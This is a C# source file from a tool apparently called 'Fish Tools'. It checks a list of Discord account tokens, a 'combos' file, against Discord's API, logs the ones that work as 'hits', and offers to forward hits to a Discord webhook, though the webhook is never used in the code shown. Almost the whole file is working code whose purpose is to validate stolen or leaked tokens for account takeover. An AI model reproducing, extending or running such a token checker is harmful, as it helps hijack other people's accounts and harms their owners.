using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Net;
using System.Text;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class DiscordAccountChecker
    {
        private static string CombosFile;
        private static readonly string HitsFile = "Result/DiscordHits.txt";
        public static int valid;
        public static int unverified;
        public static int invalid;
        private static bool UsingDiscord;
        private static string DiscordWebHook;
        private const int CooldownTime = 350;

        public static void Main(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();

            File.WriteAllText(HitsFile, string.Empty);

            logger.Info("Enter the full path to your combos file and press enter:");
            Console.Write("-> ");
            CombosFile = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(CombosFile) || !File.Exists(CombosFile))
            {
                logger.Error("Invalid file path or file does not exist. Please restart and provide a valid file path.");
                return;
            }

            logger.Info("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
            Console.Write("-> ");
            string discord = Console.ReadLine();
            UsingDiscord = !string.IsNullOrWhiteSpace(discord);
            DiscordWebHook = discord;

            TestCombos(logger).GetAwaiter().GetResult();
            Console.ReadLine();
        }
        private static async Task CheckLogin(string token, Logger logger)
        {
            WebClient client = new WebClient();
            client.Headers["Authorization"] = token;
            try
            {
                client.DownloadString("https://discord.com/api/v9/users/@me/library");
                logger.Success(token);
                File.AppendAllText(HitsFile, token + Environment.NewLine);
            }
            catch (WebException ex) { logger.Error(token); }
        }
        private static async Task TestCombos(Logger logger)
        {
            string[] combos = File.ReadAllLines(CombosFile);

            if (combos.Length == 0)
            {
                logger.Error("No combos detected in the provided file.");
                return;
            }

            logger.Warn($"Loaded Combos: {combos.Length}");

            if (ConfirmContinue(logger))
            {
                foreach (var token in combos)
                {
                    await CheckLogin(token, logger);
                    await Task.Delay(CooldownTime);
                }
            }
        }
        private static bool ConfirmContinue(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();
            return true;
        }
    }
}